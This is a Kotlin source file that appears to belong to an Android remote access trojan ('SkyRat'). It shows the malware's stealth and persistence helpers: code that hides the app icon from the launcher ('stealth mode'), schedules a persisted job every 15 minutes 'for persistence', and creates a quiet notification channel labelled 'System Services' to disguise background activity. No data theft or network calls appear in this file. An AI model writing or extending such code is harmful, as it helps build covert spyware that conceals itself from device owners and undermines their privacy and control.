package com.techsky.skyrat

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log

class Functions(private val activity: android.app.Activity?) {

    // === ESSENTIAL FUNCTIONS ONLY ===

    /**
     * Hide app icon from launcher (stealth mode)
     */
    fun hideAppIcon(context: Context) {
        try {
            val packageManager = context.packageManager
            val componentName = ComponentName(context, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("Functions", "App icon hidden successfully")
        } catch (e: Exception) {
            Log.e("Functions", "Error hiding app icon: ${e.message}")
        }
    }

    /**
     * Show app icon in launcher
     */
    fun unHideAppIcon(context: Context) {
        try {
            val packageManager = context.packageManager
            val componentName = ComponentName(context, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("Functions", "App icon shown successfully")
        } catch (e: Exception) {
            Log.e("Functions", "Error showing app icon: ${e.message}")
        }
    }

    /**
     * Schedule periodic job for persistence
     */
    fun jobScheduler(context: Context) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler

                val jobInfo = JobInfo.Builder(
                    JobSchedulerService.JOB_ID,
                    ComponentName(context, JobSchedulerService::class.java)
                )
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPersisted(true)
                    .setPeriodic(15 * 60 * 1000L) // Every 15 minutes
                    .setRequiresCharging(false)
                    .setRequiresDeviceIdle(false)
                    .build()

                val result = jobScheduler.schedule(jobInfo)
                if (result == JobScheduler.RESULT_SUCCESS) {
                    Log.d("Functions", "Job scheduled successfully")
                } else {
                    Log.e("Functions", "Job scheduling failed")
                }
            } else {
                Log.w("Functions", "JobScheduler not available on this Android version")
            }
        } catch (e: Exception) {
            Log.e("Functions", "Error scheduling job: ${e.message}")
        }
    }

    /**
     * Create notification channel for foreground services
     */
    fun createNotificationChannel(context: Context) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val notificationChannel = NotificationChannel(
                    "channelid",
                    "System Services",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Background system services"
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                }

                val manager = context.getSystemService(NotificationManager::class.java)
                manager.createNotificationChannel(notificationChannel)
                Log.d("Functions", "Notification channel created")
            }
        } catch (e: Exception) {
            Log.e("Functions", "Error creating notification channel: ${e.message}")
        }
    }
}